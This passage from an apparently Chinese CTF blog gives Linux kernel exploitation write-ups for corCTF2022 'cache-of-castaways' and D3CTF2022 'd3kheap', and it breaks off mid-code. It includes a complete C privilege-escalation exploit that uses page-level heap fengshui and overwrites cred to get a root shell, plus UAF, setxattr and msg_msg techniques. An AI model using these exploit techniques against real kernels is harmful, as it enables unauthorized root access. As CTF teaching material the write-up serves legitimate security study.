<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> pgv *<span class="title function_">alloc_pg_vec</span><span class="params">(<span class="keyword">struct</span> tpacket_req *req, <span class="type">int</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">			<span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">	free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">	pg_vec = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>alloc_one_pg_vec_page()</code> 中会直接调用 <code>__get_free_pages()</code> 向 buddy system 请求内存页，因此我们可以利用该函数进行大量的页面请求：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">alloc_one_pg_vec_page</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *buffer;</span><br><span class="line">	<span class="type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">	buffer = (<span class="type">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>pgv</code> 中的页面会在 socket 被关闭后释放，这也方便我们后续的页级堆风水，不过需要注意的是低权限用户无法使用该函数，但是我们可以通过开辟新的命名空间来绕过该限制</p>
<p>这里需要注意的是<strong>我们提权的进程不应当和页喷射的进程在同一命名空间内</strong>，因为后者需要开辟新的命名空间，而我们应当在原本的命名空间完成提权，因此这里笔者选择新开一个进程进行页喷射，并使用管道在主进程与喷射进程间通信</p>
<blockquote>
<p>如果你忘了这一步，就会和笔者一样得到一个 <code>65534</code> 的 uid 然后冥思苦想半天…</p>
</blockquote>
<h3 id="Step-2-page-level-heap-fengshui"><a href="#Step-2-page-level-heap-fengshui" class="headerlink" title="Step.2 page-level heap fengshui"></a>Step.2 page-level heap fengshui</h3><p>上一步我们实现了页喷射，当我们耗尽buddy system中的low order pages后，我们再请求的页面便都是物理连续的，因此我们再进行setsockopt()便相当于获取到了一块近乎物理连续的内存。</p>
<p>本题环境中题目的<code>kmem_cache</code>单次会向buddy system请求一张内存页，而由于buddy system遵循LIFO,因此我们可以：</p>
<ul>
<li>先分配大量单张内存页，耗尽buddy中的low-order pages</li>
<li>间隔一张内存页释放掉部分单张内存页，之后堆喷cred,这样便有可能获取到我们释放的单张内存页</li>
<li>释放掉之前的间隔内存页，调用漏洞函数分配堆块，这样便有几率获取到我们释放的间隔内存页</li>
<li>利用模块中漏洞进行越界写，篡改cred-&gt;uid,完成提权</li>
</ul>
<p>子进程需要轮询等待自己的uid变为root,但是并不是很优雅，所以这里用一个新的管道在主进程与子进程间通信，当子进程从管道中读出1字节时便开始检查是否成功提权，若未提权则直接sleep。</p>
<p>构造exp如下（直接参考的a3大佬的exp）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_CMD   0xCAFEBABE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_CMD    0xF00DBABE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SPRAY_NUM  0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_SPRAY_NUM  0x100</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_NUM 400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_SIZE    512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_PER_SLUB    8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_SLUB_NUM    (VUL_OBJ_NUM / VUL_OBJ_PER_SLUB)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">int</span> check_root_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> child_pipe_buf[<span class="number">1</span>];</span><br><span class="line"><span class="type">char</span> root_str[] = <span class="string">&quot;\033[32m\033[1m[+] Successful to get the root.\n&quot;</span></span><br><span class="line">                  <span class="string">&quot;\033[34m[*] Execve root shell now...\033[0m\n&quot;</span>;</span><br><span class="line"><span class="type">char</span> bin_sh_str[] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span> *shell_args[] = &#123; bin_sh_str, <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">size_t</span> index;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">&#125; <span class="type">castaway_request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">timer</span> =</span> &#123;</span><br><span class="line">    .tv_sec = <span class="number">1145141919</span>,</span><br><span class="line">    .tv_nsec = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">__attribute__((naked)) <span class="type">long</span> <span class="title function_">simple_clone</span><span class="params">(<span class="type">int</span> flags, <span class="type">int</span>(*fn)(<span class="type">void</span> *))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// for syscall, it&#x27;s clone(flags, stack, ...)</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r15, rsi;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor rsi, rsi;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor rdx, rdx;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor r8, r8;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor r9, r9;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rax, 56;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;syscall;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;cmp rax, 0;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;je child_fn;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;ret;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;child_fn:&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;jmp r15;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;.att_syntax&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">waiting_for_root_fn</span><span class="params">(<span class="type">void</span> *args)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// we&#x27;re using the same stack for them, so we need to avoid cracking it</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;lea rax, [check_root_pipe];&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor rdi, rdi;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov edi, dword ptr [rax];&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rsi, child_pipe_buf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rdx, 1;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor rax, rax;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;syscall;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rax, 102;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;syscall;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;cmp rax, 0;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;jne failed;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rdi, 1;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;lea rsi, [root_str];&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rdx, 80;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rax, 1;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;syscall;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;lea rdi, [bin_sh_str];&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;lea rsi, [shell_args];&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor rdx, rdx;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rax, 59;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;syscall;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;failed:&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;lea rdi, [timer];&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor rsi, rsi;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rax, 35;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;syscall;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;.att_syntax;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc_object</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">castaway_request_t</span> req;</span><br><span class="line">    ioctl(dev_fd, ALLOC_CMD, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit_object</span><span class="params">(<span class="type">size_t</span> index, <span class="type">size_t</span> size, <span class="type">char</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">castaway_request_t</span> req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    req.size = size;</span><br><span class="line">    req.data = data;</span><br><span class="line">    ioctl(dev_fd, EDIT_CMD, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="comment">// basic works</span></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// open device</span></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/castaway&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        log_info(<span class="string">&quot;open device /dev/castaway failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    log_info(<span class="string">&quot;open device /dev/castaway success!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use a new process for page spraying</span></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line">    <span class="keyword">if</span>(!fork()) &#123;</span><br><span class="line">        spray_cmd_handler();</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make buddy&#x27;s lower order clean, castaway_requesting from higher</span></span><br><span class="line">    log_info(<span class="string">&quot;spraying pgv pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;PAGE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at no.%d socket\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to spray pages via socket!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free pages for cred</span></span><br><span class="line">    log_info(<span class="string">&quot;freeing for cred pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>; i&lt;PAGE_SPRAY_NUM; i+=<span class="number">2</span>) &#123;</span><br><span class="line">        free_page(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray cred to get the isolate pages we released before</span></span><br><span class="line">    log_info(<span class="string">&quot;spraying cred...&quot;</span>);</span><br><span class="line">    pipe(check_root_pipe);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;CRED_SPRAY_NUM; i+=<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, waiting_for_root_fn) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at cloning %d child\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to clone ()!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free pages for our vulernable objects</span></span><br><span class="line">    log_info(<span class="string">&quot;freeing for vulnerable pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt; PAGE_SPRAY_NUM; i+=<span class="number">2</span>)&#123;</span><br><span class="line">        free_page(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray vulnerable objects, hope that we can make an oob-write to cred</span></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *(<span class="type">uint32_t</span>*) &amp;buf[VUL_OBJ_SIZE - <span class="number">6</span>] = <span class="number">1</span>;    <span class="comment">// cred-&gt;usage</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt; VUL_OBJ_NUM; i++) &#123;</span><br><span class="line">        alloc_object();</span><br><span class="line">        edit_object(i, VUL_OBJ_SIZE, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// checking privilege in child processes</span></span><br><span class="line">    log_info(<span class="string">&quot;notifying child processes and waiting...&quot;</span>);</span><br><span class="line">    write(check_root_pipe[<span class="number">1</span>], buf, CRED_SPRAY_NUM);</span><br><span class="line">    sleep(<span class="number">1145141919</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#%E4%BE%8B%E9%A2%98%EF%BC%9AcorCTF2022-cache-of-castaways">例题：corCTF2022 - cache-of-castaways</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>D3CTF2022-d3kheap</title>
    <url>/posts/966ad166.html</url>
    <content><![CDATA[<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>readme 里提供了部分编译配置选项，可以看到使用  SLUB 分配器，同时开启 SLAB_FREELIST_RANDOM, SLAB_FREELIST_HARDENED 等保护：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">CONFIG_STATIC_USERMODEHELPER=y</span></span><br><span class="line"><span class="string">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span></span><br><span class="line"><span class="string">CONFIG_SLUB=y</span></span><br><span class="line"><span class="string">CONFIG_SLAB_FREELIST_RANDOM=y</span></span><br><span class="line"><span class="string">CONFIG_SLAB_FREELIST_HARDENED=y</span></span><br><span class="line"><span class="string">CONFIG_HARDENED_USERCOPY=y</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看启动脚本，照例开启 smep, smap, kpti, kaslr 保护：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-m 256M \</span><br><span class="line">	-cpu kvm64,+smep,+smap \</span><br><span class="line">	-smp cores=2,threads=2 \</span><br><span class="line">	-kernel bzImage \</span><br><span class="line">	-initrd ./rootfs.cpio \</span><br><span class="line">	-nographic \</span><br><span class="line">	-monitor /dev/null \</span><br><span class="line">	-snapshot \</span><br><span class="line">	-append &quot;console=ttyS0 kaslr pti=on quiet oops=panic panic=1&quot; \</span><br><span class="line">	-no-reboot</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解包文件系统，提供了内核模块 d3kheap.ko ，同时初始化脚本如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">chown -R 0:0 /</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line">chown 0:0 /flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line">chmod 777 /tmp</span><br><span class="line"></span><br><span class="line">insmod d3kheap.ko</span><br><span class="line">chmod 777 /dev/d3kheap</span><br><span class="line"></span><br><span class="line">cat /root/banner</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">poweroff -d 0 -f</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目漏洞分析"><a href="#题目漏洞分析" class="headerlink" title="题目漏洞分析"></a>题目漏洞分析</h2><p>分析 d3kheap 模块，注册了字符设备 d3kheap，定义了 open, read, write, release, ioctl 等操作。<br>open, release, read, write 没啥好说的，只是打印了一个日志信息。<br>ioctl 定义一些操作：</p>
<ul>
<li>0x1234：申请 0x400 大小的对象，flag 为 GFP_KERNEL，这里第一个参数 kmalloc_caches[10] 为 kmem_cache 池，即 kmalloc-*。这里会将对象赋值给全局变量，申请一次。</li>
<li>0xDEAD：释放 全局变量 指针，没有进行清空。这里有一个 ref_count 变量进行计数，如果不为0才能进行释放。（这里需要注意 ref_count 被 初始化 成了1,因此可以通过 Double Free），因此存在 UAF 以及 Double Free 漏洞</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在 slub_free 中有对 double free 的简单检查（类似于 glibc 中的 fastbin，会检查 freelist 指向的第一个 object），因此不能直接 double free，而是应该转化为 UAF 进行利用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">set_freepointer</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *object, <span class="type">void</span> *fp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> freeptr_addr = (<span class="type">unsigned</span> <span class="type">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	freeptr_addr = (<span class="type">unsigned</span> <span class="type">long</span>)kasan_reset_tag((<span class="type">void</span> *)freeptr_addr);</span><br><span class="line">	*(<span class="type">freeptr_t</span> *)freeptr_addr = freelist_ptr_encode(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="构造-UAF"><a href="#构造-UAF" class="headerlink" title="构造 UAF"></a>构造 UAF</h3><p>首先很简单可以实现 UAF</p>
<ul>
<li>分配一个 1024 大小的 object</li>
<li>释放该 object</li>
<li>将其分配到别的结构体上</li>
<li>释放该 object</li>
</ul>
<h3 id="解法1：利用-setxattr-多次劫持-msg-msg"><a href="#解法1：利用-setxattr-多次劫持-msg-msg" class="headerlink" title="解法1：利用 setxattr 多次劫持 msg_msg"></a>解法1：利用 setxattr 多次劫持 msg_msg</h3><h4 id="Step1-setxattr-修改-object-内容"><a href="#Step1-setxattr-修改-object-内容" class="headerlink" title="Step1. setxattr 修改 object 内容"></a>Step1. setxattr 修改 object 内容</h4><p>接下来思考如何对一个 free 状态的 object 写入数据，这里使用的是 setxattr 系统调用。<br>setxattr 系统调用可以在 kernel 利用中提供近乎任意大小的内核空间 object 分配。<br>在 setxatrr 函数中有如下逻辑：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">     <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里 value 和 size 都是由用户指定。写入后会将其 kvfree 掉，因此我们可以通过 setxattr 多次修改 victim 的内容。<br>不够完美的一点是，slub 中 free 的 object 同样是连接成一个单向链表，因此无法控制该 object 中 kmem_cache-&gt;offset 偏移处 8 字节的内容。</p>
<h4 id="Step2-msg-msg-搜索内存完成地址泄漏"><a href="#Step2-msg-msg-搜索内存完成地址泄漏" class="headerlink" title="Step2. msg_msg 搜索内存完成地址泄漏"></a>Step2. msg_msg 搜索内存完成地址泄漏</h4><p>以上 setxattr 为任意地址写原语，接下来实现任意地址读原语。利用 msg_msg 实现。msg_msg 使用 system V 消息队列：</p>
<ul>
<li>msgget：创建一个消息队列</li>
<li>msgsnd：向指定消息队列发送消息</li>
<li>msgrcv：向指定消息队列接收消息<br>当创建消息队列时，在内核空间会分配以下结构体，表示消息队列：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="type">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="type">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="type">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
当我们调用 msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，在内核空间中会创建一个结构体：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">	<span class="type">long</span> m_type;</span><br><span class="line">	<span class="type">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="type">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
在内核中，这两个结构体形成一个循环双向链表：<img src="/posts/966ad166/file-20251014191651153.png" class="">
如果消息队列中只有一个消息则是下图：<img src="/posts/966ad166/file-20251014191736021.png" class="">
接下来深入阅读 msg_msg 的内部结构，阅读 msgsnd 源码可知，当发送一个消息<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgsnd</span><span class="params">(<span class="type">int</span> msqid, <span class="type">long</span> mtype, <span class="type">void</span> __user *mtext,</span></span><br><span class="line"><span class="params">		<span class="type">size_t</span> msgsz, <span class="type">int</span> msgflg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgsz 